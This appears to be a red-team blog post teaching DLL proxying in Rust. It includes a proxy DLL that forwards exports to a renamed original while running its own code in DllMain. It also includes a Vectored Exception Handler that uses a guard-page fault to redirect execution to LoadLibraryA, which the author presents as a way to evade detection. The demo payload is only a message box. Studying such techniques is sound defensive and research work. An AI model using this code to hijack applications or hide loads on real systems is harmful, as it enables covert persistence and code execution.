---
title: DLL-Load Proxying
layout: post
tags:
  - Red Team
  - Rust
blog_post: true
---


In this post, we'll focus on a technique known as DLL Proxying and explore its intricacies using rust lang, applications, and potential implications. So What the hell is “DLL Proxying”,

DLL Proxying is a technique in which an attacker replaces a Dynamic Link Library (DLL) with a malicious version, opting to rename the original DLL rather than deleting it. The malicious DLL is designed to exclusively implement the functions targeted for interception or modification by the attacker. Meanwhile, all other functions are forwarded to the original DLL, earning the name “Proxy” for this approach. This method allows the attacker to essentially act as a middleman, intercepting and modifying only the specific functions of interest, while seamlessly forwarding the remaining functions to the original DLL. By doing so, the attacker minimizes the amount of effort required, ensuring that overall functionality is maintained without disruption. This technique is particularly effective for carrying out specific attacks while avoiding unnecessary complications or detection.


# Overview

Recently, I've been exploring Rust and its offensive capabilities. So I thought DLL-load proxying in Rust. However, before delving into the implementation, Let's discuss the potential effectiveness of DLL Proxy loading for malicious actors. Let's examine this example more closely.

```
  Application (A)
      |
      +-- Loads "some.dll" (B)
            |
            +-- Executes "Data()" (C)

```

In the typical flow, when a DLL is loaded, the system follows a standard process. However, when executing DLL Proxy loading, the flow diverges from the usual path. In this process, a malicious actor creates a deceptive proxy DLL designed to mimic the legitimate "foo.dll." Unbeknownst to the application, it loads this proxy DLL, assuming it to be the authentic version. The proxy DLL intercepts and redirects function calls to the real "foo_Original.dll." While facilitating the intended functionality, the proxy DLL concurrently executes covert malicious code, effectively seizing control of the application's execution flow without the user's or application's knowledge.

See, 

```
  Application (A)
      |
      +-- Loads malicious "foo.dll" (C) - Attacker's Proxy DLL
            |
            +-- Intercepts and redirects calls to "foo_Original.dll" (B)
            |      |
            |      +-- Executes "Data()" (D) from the original DLL
            |      |
            |      +-- Executes additional malicious code (E)
            |
            +-- Application runs with hijacked execution flow

```

Implementing DLL proxying for a DLL with numerous exported functions can be laborious. Fortunately, there are tools available to automate this process, such as [SharpDllProxy 7](https://github.com/Flangvik/SharpDllProxy/). This tool generates the Proxy DLL source code based on the extracted functions from the original DLL. The resulting source code simply reads a file into memory and then invokes it within a new thread. This automation streamlines the implementation of DLL proxying, making it more accessible for malicious actors.

Now that we have a high-level overview of how DLL proxying works, Let’s build a legit DLL, Let’s call it `o_foo.dll`

```rust
use winapi::um::winuser::MessageBoxA;

#[no_mangle]
pub unsafe extern "C" fn legitfunction() {
    let message = "Hello!\0";
    let title = "foo\0";

    MessageBoxA(
        std::ptr::null_mut(),
        message.as_ptr() as *const i8,
        title.as_ptr() as *const i8,
        0,
    );
}
```

Now this is simple when this DLL is executed, it shows a message box with the text “Hello!” and the title “foo” on the user’s screen. Additionally, the `cargo build --release` output is stored in the sample location. Conversely, for DLL proxying, we reroute the execution of a function named `legitfunction` from one DLL to another, specifically `o_foo.dll`. This requires integrating the function into a new (DLL), featuring a `DllMain` function as the entry point for DLLs.

```rust
use forward_dll;
use winapi::um::winuser::MessageBoxA;

forward_dll::forward_dll!(
    r#"C:\Users\foo\rs\o_foo.dll"#, 
    DLL_VERSION_FORWARDER,
    legitfunction
);

#[no_mangle]
pub unsafe extern "C" fn DllMain(instance: isize, reason: u32, reserved: *const u8) -> u32 {
    if reason == 1 {
        // Display a message box to indicate the DLL is loaded
        MessageBoxA(
            std::ptr::null_mut(),
            "Malicious DLL loaded!\0".as_ptr() as *const i8,
            "foo\0".as_ptr() as *const i8,
            0,
        );

        // Forward the legitfunction from the other DLL
        let _ = DLL_VERSION_FORWARDER.forward_all();

        // Return success
        return 1;
    }
    1
}
```

When the DLL is loaded, a message box is displayed to indicate that the DLL has been successfully loaded.
## VEH

Now that we have a high-level overview of how DLL proxying works, let's dive into a technique that demonstrates dynamic DLL loading and exception handling using a Vectored Exception Handler (VEH). The goal here is to load a DLL and execute specific operations within the context of an exception, utilizing a guard page violation as a trigger for the exception handler. Vectored Exception Handlers extend Structured Exception Handling on Windows and operate independently of the call stack. VEH will be invoked for unhandled exceptions, irrespective of their location. You can find more information on Vectored Exception Handling in the [Vectored Exception Handling - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)

- Loads a DLL with a proxied exception handler.
- Triggers the VEH by setting a guard page.
- Unloads the library.

In the implementation stage, we need to establish the necessary steps for dynamically loading a DLL, installing a Vectored Exception Handler (VEH), and defining a custom exception handler tailored for guard page violations. The Vectored Exception Handler (VEH) will be utilized to manipulate the context, specifically modifying the RIP register to redirect execution to `LoadLibraryA`, and the RCX register to store the function’s argument (module name) for `LoadLibraryA`. To trigger our exception, VirtualProtect is employed to set the page to `PAGE_GUARD`, leading to a `STATUS_GUARD_PAGE_VIOLATION`.

We set up a Vectored Exception Handler (`VectoredExceptionHandler`) to manage guard page violations and dynamically load the `foo.dll` DLL using the `LoadLibraryA` function. This intricate setup ensures that we can control the loading process and execute specific operations within the context of the exception.

The VEH is designed to dynamically load a DLL (`kernel32.dll`) when such an exception occurs, to leverage a guard page violation exception as a trigger to dynamically load a DLL (`kernel32.dll`) and execute the `LoadLibraryA` function. By modifying the registers within the exception context, the code redirects the execution flow to load a specific DLL dynamically during runtime, providing a level of control over the process’s behavior.

```rust
unsafe extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_record = (*exception_info).as_ref().and_then(|info| info.ExceptionRecord);
    if exception_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_code = exception_record.unwrap().ExceptionCode;
    if exception_code != winapi::shared::ntdef::STATUS_GUARD_PAGE_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context_record = (*exception_info).as_mut().and_then(|info| info.ContextRecord);
    if context_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let kernel32_module = GetModuleHandleA(CString::new("kernel32.dll").unwrap().as_ptr());
    if kernel32_module.is_null() {
        eprintln!("Failed to get handle for kernel32.dll");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let load_library_addr = GetProcAddress(kernel32_module, CString::new("LoadLibraryA").unwrap().as_ptr()) as usize;
    if load_library_addr == 0 {
        eprintln!("Failed to get address for LoadLibraryA");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip_address = (*(*exception_info).as_mut().unwrap().ContextRecord).Rip as usize;
    let load_library_call_address = rip_address - (rip_address - load_library_addr) % 5;

    (*(*exception_info).as_mut().unwrap().ContextRecord).Rip = load_library_call_address as u64;
    (*(*exception_info).as_mut().unwrap().ContextRecord).Rcx = MODULE_NAME.as_ptr() as u64;

    EXCEPTION_CONTINUE_EXECUTION
}
```

The initial step involves obtaining the module handle of `kernel32.dll` and determining the address of the `LoadLibraryA` function within it. `LoadLibraryA` is a Windows API function responsible for loading dynamic link libraries (DLLs). Subsequently, the implementation calculates a dynamic address for the `LoadLibraryA` call based on the current instruction pointer (`Rip`). After obtaining this dynamic address, it modifies the instruction pointer (`Rip`) to point to the dynamically calculated address for the `LoadLibraryA` call. Simultaneously, it sets the RCX register to the address of the DLL name (`foo.dll`).

For Opsec, storing the `LoadLibraryA` address directly on the stack might expose a static pattern, making it susceptible to identification through static analysis. By dynamically calculating the address and avoiding a direct push to the stack, the injection technique becomes less predictable and more challenging to detect. This avoidance of direct storage on the stack, coupled with dynamic loading of DLLs and runtime calculation of function addresses, increases the overall unpredictability.

```rust
fn proxied_load_library(module_name: &str) -> Option<winapi::um::libloaderapi::HMODULE> {
    unsafe {
        let handler = AddVectoredExceptionHandler(1, Some(vectored_exception_handler));
        if handler.is_null() {
            eprintln!("Failed to install Vectored Exception Handler");
            return None;
        }

        let mut old_protection: u32 = 0;
        VirtualProtect(mem::transmute::<_, *mut winapi::ctypes::c_void>(Sleep as usize), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &mut old_protection);
        let addr = GetModuleHandleA(CString::new(module_name).unwrap().as_ptr());

        RemoveVectoredExceptionHandler(handler);

        Some(addr)
    }
}
```

Using `VirtualProtect` to set a page to `PAGE_GUARD` and induce a guard page violation serves as a subtle method for initiating the Vectored Exception Handler. This approach allows for the dynamic modification of memory protection, introducing an element of variability that makes the technique less static. By triggering the guard page violation, the implementation can seamlessly invoke the Vectored Exception Handler, enabling dynamic adjustments to memory protection settings and contributing to a stealthier execution of the injection technique. [Source Code 9](https://github.com/0xf00I/DLLProxying-rs)

This was a simple implementation of Proxy-DLL-Loads in Rust, Thanks for reading and I hope you’ve learned something!
# References

- [Proxy-DLL-Loads](https://github.com/kleiton0x00/Proxy-DLL-Loads)
- [Intercepting API Calls via DLL Redirection](https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf)
- [DLL Proxying for Persistence](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)
- [Proxying DLL Loads for Hiding ETW/ETI Stack Tracing](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/)
